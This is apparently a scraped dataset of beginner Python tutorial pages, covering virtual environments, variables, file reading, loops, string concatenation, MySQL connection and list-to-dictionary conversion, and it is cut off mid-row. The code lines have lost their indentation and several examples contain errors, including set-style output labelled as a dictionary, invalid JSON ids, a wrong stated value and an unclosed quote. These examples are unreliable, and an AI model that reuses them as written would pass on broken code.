94,['How to create a virtual environment in Python'],"[""Python application will often use the packages and additional modules that don't come as a part of a standard library. Sometimes applications may require the specific version of the library to perform a specific task or fixed a bug.""]","['https://www.javatpoint.com/how-to-declare-a-variable-in-python', 'https://www.javatpoint.com/how-to-create-a-dictionary-in-python', 'https://www.javatpoint.com/https://www.javatpoint.com/how-to-install-python', 'https://www.javatpoint.com/https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/how-to-declare-a-variable-in-python', 'https://www.javatpoint.com/how-to-create-a-dictionary-in-python', 'https://www.javatpoint.com/how-to-declare-a-variable-in-python']",[],[],[],"['The importance of creating virtual environment', 'Creating a Virtual Environment']","['Note: We can write simply python instead of python3, because it is used only if we have installed various versions of Python.']","['On Window, Press enter after typing', 'On UNIX or MacOs, run:', ""After activating the virtual environment, it will change the shell prompt's to tell what virtual environment we are using."", 'Managing Packages Using pip', 'We can install, upgrade, and delete the libraries in activated virtual environment using the Python package manager called pip. For example -', 'If we re-run the previous command, it will display the required version is already installed.']","['Suppose we are developing two applications that require an older version of the library, and other applications require a new version of libraries in the same Python installation. Sometimes, it leads to a problem.', 'The above command will create the new-env directory; it also creates the directory inside the newly created virtual environment new-env, containing a new copy of a Python interpreter.', 'All virtual environments are stored in the common directory location venv folder. Once we create the virtual environment, we have to activate it by typing the following command.']","['In the other words, one Python installation may not able to meet the requirements of every application. The requirement of the various applications may create conflict with each other. For example, - If application A requires version 1.0 and another application requires version 2.0, so they will create conflict, and the result is one application unable to run.', ""To resolve this conflicting requirement, Python offers to create the virtual environment. Application A has its environment with version 1.0. Application B has its environment with version 2.0, so if we want to upgrade application B with version 3.0, this will not affect application A's environment."", 'The module venv is used to create and manage a virtual environment. It is available with the most recent version of Python. We can decide the location to create a virtual environment and run the venv module as a script with the directory path. Type the following command in your command line and hit the enter button.']","['python3 -m venv new-env', 'new-env\\Scripts\\activate.bat', 'source new-env/bin/activate', '(new-env) $ pip install requests==2.6.0', 'Collecting requests==2.6.0', 'Using cached requests-2.6.0-py2.py3-none-any.whl', 'Installing collected packages: requests', 'Successfully installed requests-2.6.0']",[],[],[]
95,['How to declare a variable in Python'],"[""Python is a dynamic-typed language, which means we don't need to mention the variable type or declare before using it. It makes to Python the most efficient and easy to use language. Every variable is treated as an object in Python.""]","['https://www.javatpoint.com/how-to-install-matplotlib-in-python', 'https://www.javatpoint.com/how-to-create-a-virtual-environment-in-python', 'https://www.javatpoint.com/https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/how-to-install-matplotlib-in-python', 'https://www.javatpoint.com/how-to-create-a-virtual-environment-in-python', 'https://www.javatpoint.com/how-to-install-matplotlib-in-python']",[],[],"['Numbers', 'Strings']",['Multiple Assignments'],[],"['Before declaring a variable, we must follow the given rules.', ""Let's understand the declaration of a few basic variables."", '1. Assigning multiple values to multiple variables', 'We can assign the more than one variable simultaneously on the same line. For example -', 'Values are printed in the given order.', '2. Assign a single value to the multiple variables', 'We can assign the single value to the multiple variables on the same line. Consider the following example.']","[""The string is the sequence of Unicode characters. It is declared using single quotes, double quotes, or triple quotes. Let's understand the following example.""]","['Python supports three types of numbers - integer, floating point numbers, and complex. We can declare a variable with any length, there is no restriction declares any length of the variable. Use the following syntax to declare the number type variables.']","['num = 25', 'print(""The type of a"", type(num))', 'print(num)', 'float_num = 12.50', 'print(""The type of b"", type(float_num))', 'print(float_num)', 'c = 2 + 5j', 'print(""The type of c"", type(c))', 'print(""c is a complex number"", isinstance(1 + 3j, complex))', ""str_var = 'JavaTpoint'"", 'print(str_var)', 'print(type(str_var))', 'str_var1 = ""JavaTpoint""', 'print(str_var1)', 'print(type(str_var1))', ""str_var3 = '''This is string"", 'using the triple', ""Quotes'''"", 'print(str_var3)', 'print(type(str_var1))', 'a, b = 5, 4', 'print(a,b)', 'a=b=c=""JavaTpoint""', 'print(a)', 'print(b)', 'print(c)']","[""The type of a <class 'int'>"", '25', ""The type of b <class 'float'>"", '12.5', ""The type of c <class 'complex'>"", 'c is a complex number True', 'JavaTpoint', ""<class 'str'>"", 'JavaTpoint', ""<class 'str'>"", 'This is string', 'using the triple', 'Quotes', ""<class 'str'>"", '5 4', 'JavaTpoint', 'JavaTpoint', 'JavaTpoint']",[],"['|||The first character of the variable can be an alphabet or (_) underscore.|||Special characters (@, #, %, ^, &, *) should not be used in variable name.|||Variable names are case sensitive. For example - age and AGE are two different variables.|||Reserve words cannot be declared as variables.|||']"
96,['How to install matplotlib in Python'],"['A matplotlib is an open-source Python library which used to plot the graphs. It is originally conceived by the John D. Hunter in 2002. The version was released in 2003, and the latest version is released 3.1.1 on 1 July 2019.']","['https://www.javatpoint.com/how-to-install-opencv-in-python', 'https://www.javatpoint.com/how-to-declare-a-variable-in-python', 'https://www.javatpoint.com/https://www.javatpoint.com/matplotlib', 'https://www.javatpoint.com/https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/how-to-install-opencv-in-python', 'https://www.javatpoint.com/how-to-declare-a-variable-in-python', 'https://www.javatpoint.com/how-to-install-opencv-in-python']","['https://static.javatpoint.com/python/images/how-to-install-matplotlib-in-python.png', 'https://static.javatpoint.com/python/images/how-to-install-matplotlib-in-python2.png', 'https://static.javatpoint.com/python/images/how-to-install-matplotlib-in-python3.png']",[],[],"['Installing the matplotlib', 'Using pip command', 'Confirm the Installation']",[],"[""Let's see the installation of the matplotlib."", 'Using Anaconda distribution of Python', 'Installing Matplotlib using the Matplotlib', 'We can also install the matplotlib using the conda prompt. Open the conda prompt and type the following command.', 'The pip can also use to install the matplotlib library. Open the command prompt, type the following command.', 'To verify that matplotlib is installed properly or not, type the following command includes calling .__version __ in the terminal.', 'Now, we are ready to work with the matplotlib.']","[""Before working with the matplotlib library, we need to install it in out Python environment. Let's see the following method of installing matplotlib library."", ""The Anaconda distribution is an easiest way to install matplotlib library because matplotlib is pre-installed in it. So we don't need to further installation.""]","['It represents the data through the graphical form. The graphical form can be a Scatter Plot, Bar Graph, Histogram, Area Plot, Pie Plot, etc. The matplotlib library is generally used to data visualization. Data visualization allows us to make a effective decision for organization.']","['conda install matplotlib', 'pip install matplotlib', 'import matplotlib', 'matplotlib.__version__', ""'3.1.1'""]",[],[],['|||Go to its official site and click the download button.||||||Select the download the version according to your Python interpreter configuration.|||']
97,['How to install OpenCV in Python'],"['OpenCV is an open-source Python library, which used to understand the content of the digital image. The CV is the abbreviation form of computer vision. It extracts the description from the real-time image or digital image, which may be an object, a text description, and so on.']","['https://www.javatpoint.com/how-to-print-in-same-line-in-python', 'https://www.javatpoint.com/how-to-install-matplotlib-in-python', 'https://www.javatpoint.com/https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/opencv', 'https://www.javatpoint.com/how-to-print-in-same-line-in-python', 'https://www.javatpoint.com/how-to-install-matplotlib-in-python', 'https://www.javatpoint.com/how-to-print-in-same-line-in-python']","['https://static.javatpoint.com/python/images/how-to-install-opencv-in-python.png', 'https://static.javatpoint.com/python/images/how-to-install-opencv-in-python2.png', 'https://static.javatpoint.com/python/images/how-to-install-opencv-in-python3.png', 'https://static.javatpoint.com/python/images/how-to-install-opencv-in-python4.png', 'https://static.javatpoint.com/python/images/how-to-install-opencv-in-python5.png', 'https://static.javatpoint.com/python/images/how-to-install-opencv-in-python6.png']",[],['Installation of OpenCV'],"['Using pip command', 'Using Anaconda']",[],"['Here, we install the OpenCV using the following ways.', 'Open a command prompt and type the following command.', 'Or, we can install it without extra module by the following command.', 'Now, we will verify the proper installation of OpenCV. Import the cv2 module and print its version.', 'If it has properly installed, then it will show its version.', 'Now, choose a suitable bit installer.', 'Once download is completed. Open the Anaconda prompt and type the following command.', 'Then, hit the enter button and it will download all rated OpenCV configuration.', 'Now, we are ready to work with the OpenCV. You can learn complete OpenCV through our OpenCV tutorial (https://www.javatpoint.com/opencv).']","['We can perform many tasks using the OpenCV library such as face detection, face recognition, blob detection, edge-detection, image filter, template matching, and etc. To work with the OpenCV, we need to install it in our Python environment.', 'Anaconda is a software package of Python. Anaconda with Jupyter is a the best way to work with the OpenCV. First, we need to install the Anaconda graphics installer from its official site.']",[],"['pip install opencv-contrib-python --upgrade', 'pip install opencv-python', 'conda install -c conda-forge opencv']",[],[],['|||Using pip command|||Using Anaconda|||']
98,['How to print in same line in Python'],"[""The Python's print() function is used to print the result or output to the screen. By default, it jumps to the newline to printing the next statement. It has a pre-defined format to print the output. Let's understand the following example.""]","['https://www.javatpoint.com/how-to-read-json-file-in-python', 'https://www.javatpoint.com/how-to-install-opencv-in-python', 'https://www.javatpoint.com/https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/how-to-read-json-file-in-python', 'https://www.javatpoint.com/how-to-install-opencv-in-python', 'https://www.javatpoint.com/how-to-read-json-file-in-python']",[],[],[],[],[],"['Example - 1', 'Or, we can write the complete statement in single print() function.', ""The Python print() function has an argument called end, which prevents jump into the newline. Let's understand the following example."", 'Example - 3:', ""We can assign any literal to the end. Let's understand the following example."", 'Example - 4']",[],"[""In the above code, we declared a list and iterated each element using for loop. The print() function printed the first element of the list and then printed the end value which we assigned as ' ' whitespace and it will be printed till the element of the list.""]","['print(""Welcome"")', 'print(""To"")', 'print(""JavaTpoint"")', 'print(""Welcome To JavaTpoint"")', 'list1 = [10,11,12,13,14,15]', 'for i in list1:', 'print(i, end = "" "")', 'list1 = [10,11,12,13,14,15]', 'for i in list1:', 'print(i,end = ""&"")']","['Welcome', 'To', 'JavaTpoint', 'Welcome To JavaTpoint', '10 11 12 13 14 15', '10&11&12&13&14&15&']",[],[]
99,['How to read JSON file in Python'],"['JSON stands for JavaScript Object Notation, which is a popular data format to represent the structured data. It is an effective way to transmit the data between the server and web-applications.']","['https://www.javatpoint.com/how-to-read-a-text-file-in-python', 'https://www.javatpoint.com/how-to-print-in-same-line-in-python', 'https://www.javatpoint.com/https://www.javatpoint.com/json-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/json-full-form', 'https://www.javatpoint.com/how-to-read-a-text-file-in-python', 'https://www.javatpoint.com/how-to-print-in-same-line-in-python', 'https://www.javatpoint.com/how-to-read-a-text-file-in-python']",[],[],[],"['Read JSON file', 'Explanation -']",[],"['The data representation in JSON is similar to the Python dictionary. The example is given below.', 'First, we need to import the json module, and it provides the load() function to read the JSON file.', 'Suppose, we have a JSON file named student.json, which contains JSON objects.', ""Let's understand the following example.""]","['In the above code, we have used the open() function to read the JSON file. The load() function is parsed the JSON file and returned the dictionary named data.']",[],"['""book"": [', '""id"": 01,', '""language"": ""English"",', '""edition"": ""Second"",', '""author"": ""Derrick Mwiti""', '""id"": 02,', '""language"": ""French"",', '""edition"": ""Third"",', '""author"": ""Vladimir""', '{""name"": ""Peter"",', '""Subjects"": [""English"", ""Political Science""]', 'import json', ""with open(r'C:\\Users\\DEVANSH SHARMA\\student.json') as f:"", 'data = json.load(f)', 'print(data)']","['{""name"": ""Peter"", ""Subjects"": [""English"", ""Political Science""]}']",[],[]
100,['How to read a text file in Python'],"['Python provides the facility to read, write, and create files. The file can be two types - normal text and binary.']","['https://www.javatpoint.com/how-to-use-for-loop-in-python', 'https://www.javatpoint.com/how-to-read-json-file-in-python', 'https://www.javatpoint.com/https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/python-built-in-functions', 'https://www.javatpoint.com/how-to-use-for-loop-in-python', 'https://www.javatpoint.com/how-to-read-json-file-in-python', 'https://www.javatpoint.com/how-to-use-for-loop-in-python']",[],[],[],"['Reading a Text File', 'Explanation']",[],"['Here, we will learn to read the text file in Python.', 'Python takes the three required steps to read or write a text file.', 'We can specify the mode of the file while opening a file. The mode of file can be read r, write w, and append a.', 'We will open the text file using the open() function.']","['Python provides a built-in function open() to open a file. It takes mainly two arguments the filename and mode. It returns the file object, which is also called a handle. It can be used to perform various operations to the file.']","['Python provides the various function to read the file, but we will use the most common read() function. It takes an argument called size, which is nothing but a given number of characters to be read from the file. If the size is not specified, then it will read the entire file.', 'In the above code, we can see the read() function read the character according to its given size from the file. The con1 variable read the next 10 characters from the last read() function. In the last line, we closed the file after performing the read operation using the close() function.']","[""fs = open('example.txt, 'r')   # The first argument is the file name, and the second                         #argument is a mode of the file. Here r means read mode."", 'fs = open(r""C:\\Users\\DEVANSH SHARMA\\Desktop\\example.txt"",\'r\')', '# It will read the 4 characters from the text file', 'con = fs.read(4)', '# It will read the 10 characters from the text file', 'con1 = fs.read(10)', '# It will read the entire file', 'con2 = fs.read()', 'print(con)', 'fs.close()  # It will read the entire file']","['This', 'is line 1', 'This is line 2', 'This is line 3', 'This is line 4']",[],"[""|||Text Files - This type of file consists of the normal characters, terminated by the special character This special character is called EOL (End of Line). In Python, the new line ('\\n') is used by default.|||Binary Files - In this file format, the data is stored in the binary format (1 or 0). The binary file doesn't have any terminator for a newline.||||||Open a file|||Read or Write file|||Close file|||""]"
101,['How to use for loop in Python'],['Python for loop iterate over the sequences. It repeats the piece of code n number of times. Consider the following flowchart of for loop.'],"['https://www.javatpoint.com/is-python-scripting-language', 'https://www.javatpoint.com/how-to-read-a-text-file-in-python', 'https://www.javatpoint.com/https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/is-python-scripting-language', 'https://www.javatpoint.com/how-to-read-a-text-file-in-python', 'https://www.javatpoint.com/is-python-scripting-language']",['https://static.javatpoint.com/python/images/how-to-use-for-loop-in-python.png'],[],[],"['Flowchart', 'Using Sequence', 'Using the range() function']",[],"['Python for loop can be used in two ways.', ""Let's understand the following example."", 'Example - 1', 'Example - 2', 'It accepts the three arguments.', ""Let's understand the following example."", 'Example - 1', 'Example - 2 Traverse the List element using range() function', 'Explanation:', 'The len() function returns the length of the list. The range() got the number of elements in the list and printed its elements.']","['The sequence is referred to as list, set, string, tuple, and dictionary in Python. We can extract the elements of the sequence using for loop. Below is the syntax for loop.', 'The range function() generates the sequence of the numbers. For example, if we execute the range(5) and it will generate the 0 to 4. The syntax of the range() function is given below.']",[],"['for iterating_var in sequence:', 'statement(s)', 'list1 = [10, 20, 30, 40, 50, 60]', 'for i in list1:', 'print(i)', 'str = ""JavaTpoint""', 'for i in str:', 'print(i)', 'range(start, stop, step-size)', 'for i in range(20):', ""print(i, end = ' ')"", ""list = ['Peter', 'Joseph', 'Ricky', 'Devansh', 'Kevin']"", 'for i in range(len(list)):', 'print(""Hii"",list[i])']","['10', '20', '30', '40', '50', '60', 'J', 'a', 'v', 'a', 'T', 'p', 'o', 'i', 'n', 't', '0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19', 'Hii Peter', 'Hii Joseph', 'Hii Ricky', 'Hii Devansh', 'Hii Kevin']",[],"['|||Using Sequence|||Using range() function||||||The start represents the beginning of the iteration.|||The stop indicates the end of for loop. It will iterate till stop-1.|||The step size skips the specific number of iteration. By default, the step size is 1.|||']"
102,['Is Python scripting language?'],"['Yes, Python is scripting, general-purpose, high-level, and interpreted programming language. It also provides the object-oriented programming approach. The filename extension of Python can be various types such as .py, .pyw, .pyc, .pyd, .pyz.']","['https://www.javatpoint.com/how-long-does-it-take-to-learn-python', 'https://www.javatpoint.com/how-to-use-for-loop-in-python', 'https://www.javatpoint.com/https://www.javatpoint.com/perl-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/javascript-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/bash', 'https://www.javatpoint.com/how-long-does-it-take-to-learn-python', 'https://www.javatpoint.com/how-to-use-for-loop-in-python', 'https://www.javatpoint.com/how-long-does-it-take-to-learn-python']",[],[],[],"['What is a scripting language?', 'Features of Scripting Language']",[],['Below are the features of the scripting language.'],[],"['The scripting language is referred to perform the task based on automating a repeated task. It includes same types of steps while implementing the procedure or program. It reduces time and cuts the costs further. The scripting languages are interpreted language instead of a compiled language. The name of few scripting languages is Perl, Visual Basic, JavaScript, Python, Unix Shell Scripts, ECMAScript, and Bash etc.']",[],[],[],"[""|||It runs faster and complete task efficiently.|||It is easy to learn and easy to use.|||No IDEs are required to write code.|||It is suitable for automation tasks.|||Scripting language doesn't require the memory to run the program.|||Less line code requires completing the task as compared to other languages.|||""]"
103,['How long does it take to learn Python'],['Python is the most versatile and popular programming language. It is the recommended language for beginners; even the experienced programmers are also learning the Python. Python makes the task easy and performs it in a few lines of code where other programming languages take many lines.'],"['https://www.javatpoint.com/how-to-concatenate-two-strings-in-python', 'https://www.javatpoint.com/is-python-scripting-language', 'https://www.javatpoint.com/https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/windows', 'https://www.javatpoint.com/https://www.javatpoint.com/linux-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/data-science', 'https://www.javatpoint.com/https://www.javatpoint.com/artificial-intelligence-tutorial', 'https://www.javatpoint.com/how-to-concatenate-two-strings-in-python', 'https://www.javatpoint.com/is-python-scripting-language', 'https://www.javatpoint.com/how-to-concatenate-two-strings-in-python']",[],[],[],"['Why learn Python', 'How long will it take to learn?']",[],"['1. It is easy to learn and use', 'It has straight forward syntax and much the same as the English language.', '2. Interpreted Language', 'It executes the code one line at a time, which makes it easy to debug and portable.', '3. Cross-Platform', 'Python can run the same on different platforms such as Windows, Linux, UNIX, and Macintosh.', '4. Free and Open Source', 'Python can download without paying any penny. It is freely available on its websites. It has a vast community across the world.', '5. Large Standard Libraries']","[""Let's understand why we should choose Python over the other programming language. It will take a few times to learn since it has a number of libraries and many concepts."", 'Python has many libraries for almost every field, such as Data Science, Artificial Intelligence, Web development, networking, etc. No other programming language has such libraries in comparison to Python.', 'There are many other features that make Python popular and useful language of the current scenario. These Features are GUI Programming Support, Integration, and Dynamic memory allocation.']","['Choosing Python is a good decision for your future. It will take 6-8 weeks to learn basic concepts of Python at a regular pace. Learning time-period also depends on the other factors, such as how much time you spend to learn the Python; you have an idea of any programming language previously.', 'Some programming experts suggest to beginners sit in front of the computer every day 7-8 hours for two-month. This is not suitable for who are currently working or who are not in a coding boot camp. You can prefer this schedule if you have a devotee time-period or you are not involved in other activities.', 'Another option is to spend 2-3 hours a day on the computer. One day, learn something; the next day; do a decent amount of practice. It will do on a daily basis in order to make sure you learn in the decent amount of time. However, this process is easier to maintain from the previous one. The only learning is not a goal; you should implement that knowledge to sharpen your practical knowledge. The ultimate goal of any programming language is to develop something useful.']",[],[],[],[]
104,['How to concatenate two strings in Python'],['Python string is a collection of Unicode characters. Python provides many built-in functions for string manipulation. String concatenation is a process when one string is merged with another string. It can be done in the following ways.'],"['https://www.javatpoint.com/how-to-connect-database-in-python', 'https://www.javatpoint.com/how-long-does-it-take-to-learn-python', 'https://www.javatpoint.com/https://www.javatpoint.com/python-built-in-functions', 'https://www.javatpoint.com/https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/how-to-connect-database-in-python', 'https://www.javatpoint.com/how-long-does-it-take-to-learn-python', 'https://www.javatpoint.com/how-to-connect-database-in-python']",[],[],[],"['Using + operator', 'Using join() method', 'Using % Operator', 'Using format() function']",[],"[""Let's understand the following string concatenation methods."", 'Explanation:', ""The join() method is used to join the string in which the str separator has joined the sequence elements. Let's understand the following example."", 'Explanation:', ""The % operator is used for string formatting. It can also be used for string concatenation. Let's understand the following example."", 'Explanation -', 'Explanation:']","[""This is an easy way to combine the two strings. The + operator adds the multiple strings together. Strings must be assigned to the different variables because strings are immutable. Let's understand the following example."", 'In the above example, the variable str1 stores the string ""Hello"", and variable str2 stores the ""Devansh"". We used the + operator to combine these two string variables and stored in str3.', 'In the above code, the variable str1 stores the string ""Hello"" and variable str2 stores the ""JavaTpoint"". The join() method returns the combined string that is stored in the str1 and str2. The join() method takes only list as an argument.', 'In the above code, the %s represents the string data-type. We passed both variables\'s value to the %s that combined the strings and returned the ""Hello JavaTpoint"".', ""Python provides the str.format() function, which allows use of multiple substitutions and value formatting. It accepts the positional arguments and concatenates the string through positional formatting. Let's understand the following example."", 'In the above code, the format() function combines both strings and stores into the str3 variable. The curly braces {} are used as the position of the strings.']",[],"['# Python program to show', '# string concatenation', '# Defining strings', 'str1 = ""Hello ""', 'str2 = ""Devansh""', '# + Operator is used to strings concatenation', 'str3 = str1 + str2', 'print(str3)   # Printing the new combined string', '# Python program to', '# string concatenation', 'str1 = ""Hello""', 'str2 = ""JavaTpoint""', '# join() method is used to combine the strings', 'print("""".join([str1, str2]))', '# join() method is used to combine', '# the string with a separator Space("" "")', 'str3 = "" "".join([str1, str2])', 'print(str3)', '# Python program to demonstrate', '# string concatenation', 'str1 = ""Hello""', 'str2 = ""JavaTpoint""', '# % Operator is used here to combine the string', 'print(""% s % s"" % (str1, str2))', '# Python program to show', '# string concatenation', 'str1 = ""Hello""', 'str2 = ""JavaTpoint""', '# format function is used here to', '# concatenate the string', 'print(""{} {}"".format(str1, str2))', '# store the result in another variable', 'str3 = ""{} {}"".format(str1, str2)', 'print(str3)']","['Hello Devansh', 'HelloJavaTpoint', 'Hello JavaTpoint', 'Hello JavaTpoint', 'Hello JavaTpoint', 'Hello JavaTpoint']",[],['|||Using + operators|||Using join() method|||Using % method|||Using format() function|||']
105,['How to connect Database in Python'],"['The database is a well-organized collection of structured information or data stored in a computer system. In database, the data is arranged in the tabular form, and we can access that information or data by querying.']","['https://www.javatpoint.com/how-to-convert-list-to-dictionary-in-python', 'https://www.javatpoint.com/how-to-concatenate-two-strings-in-python', 'https://www.javatpoint.com/https://www.javatpoint.com/mysql-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/how-to-install-mysql', 'https://www.javatpoint.com/https://www.javatpoint.com/python-mysql-database-connection', 'https://www.javatpoint.com/how-to-convert-list-to-dictionary-in-python', 'https://www.javatpoint.com/how-to-concatenate-two-strings-in-python', 'https://www.javatpoint.com/how-to-convert-list-to-dictionary-in-python']",[],[],"['Install MySQL Driver', 'Create a Connection Object', 'Create a Cursor Object']",['Executes the Query'],[],"['Press the enter button. It will download the MySQL driver.', ""Let's check whether we have installed it properly or not. It can be done by importing the mysql.connector."", 'If this line is executed without error, it means MySQL connector has installed properly. We are ready to use it.', 'The connect() function accepts the following arguments.', 'Consider the following example.', ""Let's understand the following example."", ""In the following example, we will create a database by executing the query. Let's understand the following example.""]","[""Python can be used to connect the Database. MySQL is one of the most popular Databases. In this tutorial, we will learn to establish a connection to MySQL via Python. Let's understand the following steps to work with the MySQL using Python."", 'First, we need a MySQL driver in our system. Install the MySQL software and configure the settings. We will use the MySQL connector driver, which is installed using the pip command. Open a command prompt and type the following command.', 'The mysql.connector provides the connect() method used to create a connection between the MySQL database and the Python application. The syntax is given below.', 'In the above tutorial, we have discussed how we can establish a connection to MySQL via Python. You can learn complete Python with MySQL from (https://www.javatpoint.com/python-mysql-database-connection).']",['The connection object is necessary to create because it provides the multiple working environments the same connection to the database. The cursor() function is used to create the cursor object. It is import for executing the SQL queries. The syntax is given below.'],"['python -m pip install mysql-connector-python', 'import mysql.connector', 'Conn_obj= mysql.connector.connect(host = <hostname>, user = <username>, passwd = <password>)', 'import mysql.connector', '# Creating a the connection object', 'conn_obj = mysql.connector.connect(host=""localhost"", user=""root"", passwd=""admin123"")', '# printing the connection object', 'print(conn_obj)', 'Con_obj = conn.cursor()', 'import mysql.connector', '# Creating the connection object', 'conn_obj = mysql.connector.connect(host=""localhost"", user=""root"", passwd=""admin123"", database=""mydatabase"")', '# printing the connection object', 'print(conn_obj)', '# creating the cursor object', 'cur_obj = conn_obj.cursor()', 'print(cur_obj)', 'import mysql.connector', '# Creating the connection object', 'conn_obj = mysql.connector.connect(host=""localhost"", user=""root"", passwd=""admin123"")', '# creating the cursor object', 'cur_obj = conn_obj.cursor()', '# creating a new database using query', 'cur_obj.execute(""create database New_PythonDB"")', '# getting the list of all the databases which will now include the new database New_PythonDB', 'dbms = cur_obj.execute(""show databases"")', 'except:', 'conn_obj.rollback() # it is used if the operation is failed then it will not reflect in your database', 'for x in cur_obj:', 'print(x)', 'conn_obj.close()']","['<mysql.connector.connection.MySQLConnection object at 0x7fb142edd780>', '', 'MySQLCursor: (Nothing executed yet)', ""'information_schema',)"", ""('javatpoint',)"", ""('javatpoint1',)"", '(New_Pythondb)', ""('mydb',)"", ""('mydb1',)"", ""('mysql',)"", ""('performance_schema',)"", ""('testDB',)""]",[],"[""|||Verify the Driver||||||Hostname - It represents the server name or IP address on which MySQL is running.|||Username - It represents the name of the user that we use to work with the MySQL server. By default, the username for the MySQL database is root.|||Password - The password is provided at the time of installing the MySQL database. We don't need to pass a password if we are using the root.|||Database - It specifies the database name which we want to connect. This argument is used when we have multiple databases.|||&&&|||Install MySQL Driver|||Create a connection Object|||Create a cursor Object|||Execute the Query|||""]"
106,['How to convert list to dictionary in Python'],"['Lists and Dictionaries are two data structure which is used to store the Data. List stores the heterogeneous data type and Dictionary stores data in key-value pair. Here, we are converting the Python list into dictionary. Since list is ordered and dictionary is unordered so output can differ in order. Python list stores the element in the following way.']","['https://www.javatpoint.com/how-to-declare-a-global-variable-in-python', 'https://www.javatpoint.com/how-to-connect-database-in-python', 'https://www.javatpoint.com/https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/python-lists', 'https://www.javatpoint.com/https://www.javatpoint.com/python-dictionary', 'https://www.javatpoint.com/how-to-declare-a-global-variable-in-python', 'https://www.javatpoint.com/how-to-connect-database-in-python', 'https://www.javatpoint.com/how-to-declare-a-global-variable-in-python']",[],[],[],"['Method - 1 Using Dictionary Comprehension', 'Method - 2 Using zip() function']",[],"['In this tutorial, we will learn the conversion Python list to dictionary.', 'Sample Input:', ""Let's understand the following methods."", ""We can convert the list into dictionary using the dictionary comprehension. Let's understand the following code."", 'Explanation -', ""Let's understand another example."", 'Example - 2', 'Explanation:', 'In the above code, we have created square_dict with number-square key/value pair.', ""Let's understand the following example.""]","['On the other hand, Dictionary is unordered, and stores the unique data. It stores the data in key value pair where each key is associated with it value. Python Dictionary stores the data in following way.', 'In the above code, we have created a student list to be converted into the dictionary. Using the dictionary compression, we converted the list in dictionary in a single line. The list elements tuned into key and passed as a value.', 'The zip() function is used to zip the two values together. First, we need to create an iterator and initialize to any variable and then typecast to the dict() function.']",[],"['student_marks = [56, 78, 96, 37, 85]', ""student_dict = {'Abhinay': 56, 'Sharma': 78, 'Himanshu': 96, 'Peter': 37}"", ""Input : ['Name', 'Abhinay', 'age', 25, 'Marks', 90]"", ""Output : {'Name', 'Abhinay', 'age', 25, 'Marks', 90}"", ""Input : ['a', 10, 'b', 42, 'c', 86]"", ""Output : {'a', 10, 'b', 42, 'c', 86}"", 'student = [""James"", ""Abhinay"", ""Peter"", ""Bicky""]', 'student_dictionary = { stu : ""Passed"" for stu in student }', 'print(student_dictionary)', 'list1 = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]', 'square_dict = {n: n*n for n in list1}', 'print(square_dict)', 'def Convert_dict(a):', 'init = iter(list1)', 'res_dct = dict(zip(init, init))', 'return res_dct', '# Driver code', ""list1 = ['x', 1, 'y', 2, 'z', 3]"", 'print(Convert_dict(list1))']","[""{'James': 'Passed', 'Abhinay': 'Passed', 'Peter': 'Passed', 'Bicky': 'Passed'}"", '{1: 1, 2: 4, 3: 9, 4: 16, 5: 25, 6: 36, 7: 49, 8: 64, 9: 81, 10: 100}', ""{'x': 1, 'y': 2, 'z': 3}""]",[],[]
107,['How to declare a global variable in Python'],"['A variable which can be accessed by the other block is called a global variable. It can be defined in outside a block. In other words, a global variable is defined outside the function, and we can access it inside the function.']","['https://www.javatpoint.com/how-to-reverse-a-number-in-python', 'https://www.javatpoint.com/how-to-convert-list-to-dictionary-in-python', 'https://www.javatpoint.com/how-to-reverse-a-number-in-python', 'https://www.javatpoint.com/how-to-convert-list-to-dictionary-in-python', 'https://www.javatpoint.com/how-to-reverse-a-number-in-python']",[],[],"['The Global Keyword\nPython provides the global Keyword that is used to modify the value of the global variable inside the function. It is beneficial when we want to change the value of the global variable or assign some other value. Below are a few rules to define the global variables.\nRules of global Keywords\n\nIf the value is defined output the function, it will automatically become the global variable or its scope globally.\nThe global Keyword is used to declare the global variable inside a function.\nWe don\'t need to use the global keyword to declare a global variable outside the function.\nVariables that have reference inside a function are implicitly global.\n\nExample - Without global keyword\n\r\n# The example of without using the global keyword\r\n\r\nc = 10\r\n\r\ndef mul():\r\n\r\n    # Multiply by 10\r\n    c = c * 10\r\n    print(c)\r\n\r\nmul()\r\n\nOutput:\nline 8, in mul\r\n    c = c * 10\r\nUnboundLocalError: local variable \'c\' referenced before assignment\r\n\nExplanation:\nThe above code has thrown an error because we have tried to assign the value to the global variable. We can modify the value of global value inside a function using the global keyword.\nExample - With global Keyword\n\r\n# The example using the global keyword\r\n\r\nc = 10\r\n\r\ndef mul():\r\n    global c\r\n    # Multiply by 10\r\n    c = c * 10\r\n    print(""The value inside function: "", c)\r\n\r\nmul()\r\nprint(\'The value outside the function: \', c)\r\n\nOutput:\nThe value inside function:  100\r\nThe value outside the function:  100\r\n\nExplanation:\nIn the above example, we have defined the variable c in mul() function using the global keyword. The value of c is multiplied by the 10; therefore, it returned the 200. We can see in the output that the variation in value inside the function is reflected in the value outside the global variable.\nGlobal Variables in Python Modules\nThe benefit of the global keyword is to create global variables and share them among the different modules. For example - we create a name.py which consists of global variables. If we change these variables, then this change will reflect everywhere. Let\'s understand the following example.\nCode - 1: Make a name.py file to store the global variables.\n\r\na = 10\r\nb = 20\r\nmsg = ""Hello World""\r\n\nCode - 2: Make a change.py file to modify global variables.\n\r\nimport name\r\nname.a = 15\r\nname.b = 26\r\nname.msg = ""Welcome to JavaTpoint""\r\n\nHere, 